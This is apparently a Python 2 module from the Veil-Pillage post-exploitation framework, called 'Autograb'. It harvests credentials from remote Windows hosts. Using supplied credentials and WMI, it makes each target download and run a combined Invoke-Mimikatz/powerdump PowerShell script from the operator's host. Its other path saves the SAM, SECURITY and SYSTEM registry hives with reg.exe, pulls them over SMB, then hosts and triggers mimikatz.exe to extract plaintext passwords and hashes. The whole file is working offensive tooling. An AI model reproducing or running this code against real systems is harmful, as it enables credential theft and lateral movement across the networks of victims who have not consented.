"""

Auto-detect powershell and determine the best method possible
for dumping hashes/plaintext credentials.

Module built by @harmj0y


Approach:
    Detect powershell
        if yes ->   use powerdump (https://github.com/RC1140/ZaCon/blob/master/powerdump.ps1) to dump hashes
                    use powersploit's mimikatz dropper for plaintext
                        combine these two into one ps1 file to download/execute on the host?
        if no  ->   use reg.exe copy/download method and creddump (https://code.google.com/p/creddump/)
                        use mimikatz host/execute

"""

import settings

import time

from lib import helpers
from lib import smb
from lib import command_methods
from lib import delivery_methods

# get our nifty hashdumping functionality
from lib import creddump

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):

        self.name = "Autograb"
        self.description = ("Determine architecture/powershell install and dump "
                            "hashes/plaintext creds as appropriate.")

        # internal list() that holds one or more targets set by the framework
        self.targets = targets

        # internal list() that holds one or more cred tuples set by the framework
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # any relevant text to echo to the output file
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {   "use_ssl"        :  ["false", "use https for hosting"],
                                    "lhost"          :  ["", "local IP for [host] transport"],
                                    "delay"          :  ["5", "delay (in seconds) before grabbing the results file"],
                                    "force_method"   :  ["none", "force [binary] or [powershell]"],
                                    "out_file"       :  ["sys.out", "temporary output filename used"]}

    def run(self):

        # assume single set of credentials for this module
        username, password = self.creds[0]

        lhost = self.required_options["lhost"][0]
        use_ssl = self.required_options["use_ssl"][0]
        force_method = self.required_options["force_method"][0]
        delay = self.required_options["delay"][0]
        out_file = self.required_options["out_file"][0]

        # let's keep track of all credentials found
        allhashes, allmsv, allkerberos, allwdigest, alltspkg  = [], [], [], [], []

        for target in self.targets:
            
            powershellInstalled = False

            # check if we're forcing a particular grab method
            if force_method.lower() == "binary":
                powershellInstalled = False
            elif force_method.lower() == "powershell":
                powershellInstalled = True
            else:
                # check if we have a functional Powershell installation
                powershellCommand  = "powershell.exe -c \"$a=42;$a\""
                powershellResult = command_methods.executeResult(target, username, password, powershellCommand, "wmis")
                if powershellResult.strip() == "42": powershellInstalled = True

            if powershellInstalled:

                # do powersploit combined file of invoke-mimikatz and powerdump
                print helpers.color("\n [*] Powershell installed on "+target)
                self.output += "[*] Powershell installed on "+target+", using autograb.ps1\n"

                # the temporary output file we will write to
                if "\\" not in out_file:
                    # otherwise assume it's an absolute path
                    out_file = "C:\\Windows\\Temp\\" + out_file         

                # path to the combined Invoke-Mimikatz/powerdump powershell script
                secondStagePath = settings.VEIL_PILLAGE_PATH+"/data/misc/autograb.ps1"
               
                # trigger the powershell download on just this target
                delivery_methods.powershellHostTrigger(target, username, password, secondStagePath, lhost, "", triggerMethod="winexe", outFile=out_file, ssl=use_ssl, noArch=True)

                print "\n [*] Waiting "+delay+"s for Autograb to run..."
                time.sleep(int(delay))

                # grab the output file and delete it
                out = smb.getFile(target, username, password, out_file, delete=True)

                # save the file off to the appropriate location
                saveFile = helpers.saveModuleFile(self, target, "autograb.txt", out)

                # parse the mimikatz output and append it to our globals
                (msv1_0, kerberos, wdigest, tspkg) = helpers.parseMimikatz(out)
                allmsv.extend(msv1_0)
                allkerberos.extend(kerberos)
                allwdigest.extend(wdigest)
                alltspkg.extend(tspkg)

                # parse the powerdump component
                hashes = helpers.parseHashdump(out)
                allhashes.extend(hashes)

                if out != "":
                    self.output += "[*] Autograb.ps1 results using creds '"+username+":"+password+"' on "+target+" stored at "+saveFile+"\n"
                else:
                    self.output += "[!] Autograb.ps1 failed using creds '"+username+":"+password+"' on "+target+" : no result file\n"

            else:
                # do reg.exe for hashdump and host/execute for mimikatz
                print helpers.color("\n [!] Powershell not installed on "+target, warning=True)
                print helpers.color("\n [*] Using reg.exe save method for hash dumping on "+target)
                self.output += "[!] Powershell not installed on "+target+"\n"

                # reg.exe command to save off the hives
                regSaveCommand = "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system /y && reg save HKLM\\SECURITY C:\\Windows\\Temp\\security /y && reg save HKLM\\SAM C:\\Windows\\Temp\\sam /y"

                # execute the registry save command
                command_methods.executeCommand(target, username, password, regSaveCommand, "wmis")

                print helpers.color("\n [*] Dumping hashes on " + target)

                # sleep for 5 seconds to let everything backup
                time.sleep(5)

                # grab all of the backed up files
                systemFile = smb.getFile(target, username, password, "C:\\Windows\\Temp\\system", delete=False)
                securityFile = smb.getFile(target, username, password, "C:\\Windows\\Temp\\security", delete=False)
                samFile = smb.getFile(target, username, password, "C:\\Windows\\Temp\\sam", delete=False)

                # more error-checking here?
                if systemFile == "":
                    self.output += "[!] File '"+systemFile+"' from "+target+" empty or doesn't exist\n"
                else:
                    f = open('/tmp/system', 'w')
                    f.write(systemFile)
                    f.close()   

                if securityFile == "":
                    self.output += "[!] File '"+securityFile+"' from "+target+" empty or doesn't exist\n"
                else:
                    f = open('/tmp/security', 'w')
                    f.write(securityFile)
                    f.close()   

                if samFile == "":
                    self.output += "[!] File '"+samFile+"' from "+target+" empty or doesn't exist\n"
                else:
                    f = open('/tmp/sam', 'w')
                    f.write(samFile)
                    f.close()   

                # get all the hashes from these hives
                out = creddump.dump_file_hashes("/tmp/system", "/tmp/sam")

                # save the output file off
                saveLocation = helpers.saveModuleFile(self, target, "creddump.txt", out)
                self.output += "[*] dumped hashes (reg.exe) using creds '"+username+":"+password+"' on "+target+" saved to "+saveLocation+"\n"

                # save these off to the universal list
                hashes = helpers.parseHashdump(out)
                allhashes.extend(hashes)

                # now, detect the architecture
                archCommand = "echo %PROCESSOR_ARCHITECTURE%"
                archResult = command_methods.executeResult(target, username, password, archCommand, "wmis")
                arch = "x86"
                if "64" in archResult: arch = "x64"

                # now time for ze mimikatz!
                mimikatzPath = settings.VEIL_PILLAGE_PATH + "/data/misc/mimikatz"+arch+".exe"

                # the temporary output file we will write to
                if "\\" not in out_file:
                    # otherwise assume it's an absolute path
                    out_file = "C:\\Windows\\Temp\\" + out_file         

                exeArgs = "\"sekurlsa::logonPasswords full\" \"exit\" >" + out_file

                # host mimikatz.exe and trigger it ONLY on this particular machine
                # so we can get the architecture correct
                delivery_methods.hostTrigger(target, username, password, mimikatzPath, lhost, triggerMethod="wmis", exeArgs=exeArgs)

                print "\n [*] Waiting "+delay+"s for Mimikatz to run..."
                time.sleep(int(delay))

                # grab the output file and delete it
                out = smb.getFile(target, username, password, out_file, delete=True)

                # parse the mimikatz output and append it to our globals
                (msv1_0, kerberos, wdigest, tspkg) = helpers.parseMimikatz(out)

                allmsv.extend(msv1_0)
                allkerberos.extend(kerberos)
                allwdigest.extend(wdigest)
                alltspkg.extend(tspkg)

                # save the file off to the appropriate location
                saveFile = helpers.saveModuleFile(self, target, "mimikatz.txt", out)

                if out != "":
                    self.output += "[*] Mimikatz results using creds '"+username+":"+password+"' on "+target+" stored at "+saveFile+"\n"
                else:
                    self.output += "[!] Mimikatz failed using creds '"+username+":"+password+"' on "+target+" : no result file\n"


        if len(allhashes) > 0:
            allhashes = sorted(set(allhashes))
            self.output += "[*] All unique hashes:\n\t" + "\n\t".join(allhashes) + "\n"
        if len(allmsv) > 0:
            allmsv = sorted(set(allmsv))
            self.output += "[*] All msv1_0:\n\t" + "\n\t".join(allmsv) + "\n"
        if len(allkerberos) > 0:
            allkerberos = sorted(set(allkerberos))
            self.output += "[*] All kerberos:\n\t" + "\n\t".join(allkerberos) + "\n"
        if len(allwdigest) > 0:
            allwdigest = sorted(set(allwdigest))
            self.output += "[*] All wdigest:\n\t" + "\n\t".join(allwdigest) + "\n"
        if len(alltspkg) > 0:
            alltspkg = sorted(set(alltspkg))
            self.output += "[*] All tspkg:\n\t" + "\n\t".join(alltspkg) + "\n"
